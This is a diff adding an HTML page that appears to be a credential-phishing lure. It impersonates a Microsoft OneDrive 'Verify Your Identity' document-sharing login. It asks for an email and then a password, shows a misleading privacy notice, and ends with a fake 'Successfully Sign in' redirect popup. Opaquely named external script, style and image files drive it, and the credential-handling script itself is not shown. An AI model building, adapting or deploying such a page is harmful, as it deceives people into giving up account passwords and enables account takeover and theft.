@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>ENGAGE (Caribbean)</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="DHPO217110.css">
+</head>
+<body>
+
+<div class="login-card">
+    <div class="logo-area">
+        <div class="brand-logo">
+            <img src="A4-70GSM.png" alt="Fedelis Logo" class="logo-image">
+        </div>
+        <!-- logo-text removed -->
+    </div>
+
+    <div class="form-header">
+        <span id="form-title">Verify Your Identity</span>
+        <div class="header-submsg">
+            
+        </div>
+    </div>
+
+    <div class="form-container">
+        <!-- Step 1: Email Form -->
+        <div id="step1" class="step">
+            <div class="input-group">
+    
+                <input type="email" id="emailInput" placeholder="Enter Email" autocomplete="email">
+                <div class="info-message">Enter Email the document shared with</div>
+                <div class="info-message">Not your computer? Use Private mode to access the OneDrive</div>
+            </div>
+            <button id="nextToPasswordBtn" class="next-btn">Next</button>
+        </div>
+
+        <!-- Step 2: Password Form -->
+        <div id="step2" class="step hidden-step">
+            <div class="email-preview">
+                <i class="fas fa-arrow-left"></i> <span id="displayEmailValue">—</span>
+            </div>
+            <div class="input-group">
+                <label>Enter Password</label>
+                <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password">
+            </div>
+            <div class="privacy-message">
+            By clicking Next you allow OneDrive to use your email address in accordance with their privacy statement. OneDrive has not provided links to their terms for you to review.
+            </div>
+            <button id="finalSubmitBtn" class="submit-btn">Sign in</button>
+        </div>
+    </div>
+</div>
+
+<div id="successPopup" class="popup-modal">
+    <div class="popup-content">
+        <i class="fas fa-check-circle"></i>
+        <h3>✅ Successfully Sign in</h3>
+        <p>Identity verified. Redirecting to secure document...</p>
+        <small>popup will close automatically</small>
+    </div>
+</div>
+
+<script src="BLN72076_03.js"></script>
+</body>
+</html>
